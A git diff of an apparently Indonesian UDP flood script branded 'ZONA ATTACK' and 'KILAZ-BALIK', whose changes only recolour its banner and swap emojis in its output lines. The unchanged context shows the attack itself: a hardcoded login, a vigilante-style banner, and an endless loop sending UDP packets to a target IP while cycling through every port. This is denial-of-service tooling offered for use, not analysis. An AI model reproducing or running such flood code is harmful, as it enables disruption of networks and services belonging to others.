@@ -52,7 +52,7 @@ while attemps < 100:
     password = input('\033[94mEnter your password: \033[0m')
 
     if username == 'k0l4pz' and password == 'k0l4pz':
-        print('\033[31mWELCOME TO ZONA ATTACK!!\033[0m')
+        print('\033[33mWELCOME TO ZONA ATTACK!!\033[0m')
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -68,13 +68,13 @@ print("\033[33m  ⟩⟩  SCRIPT INI... \033[0m "),
 time.sleep(5),
 print("\033[32m  ⟩⟩  HANYA BOLEH KAU GUNAKAN \033[0m "),
 time.sleep(5),
-print("\033[31m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
+print("\033[91m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
 time.sleep(5),
 print("\033[98m  ⟩⟩  BAKTERI YG MERUGIKAN KEHIDUPAN \033[0m "),
 time.sleep(5),
 print("\033[96m  ⟩⟩  MERUSAK MORAL AGAMA & BANGSA \033[0m "),
 time.sleep(5),
-print("\033[90m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
+print("\033[97m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
 time.sleep(5),
 
 sent = 0
@@ -82,7 +82,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"\033[97m[🧨\033[99m KILAZ-BALIK\033[97m]   Sent  \033[33mPacket:::.... " +ip+ "\033[0m" )
-     print(f"\033[93m[🧨\033[99m KILAZ-BALIK\033[93m]   Attack  \033[1mThread:::.... " +ip+ "\033[0m" )
+     print(f"\033[97m[🚀\033[99m KILAZ-BALIK\033[97m]   Sent  \033[33mPacket:::.... " +ip+ "\033[0m" )
+     print(f"\033[93m[💥\033[99m KILAZ-BALIK\033[93m]   Attack  \033[1mThread:::.... " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
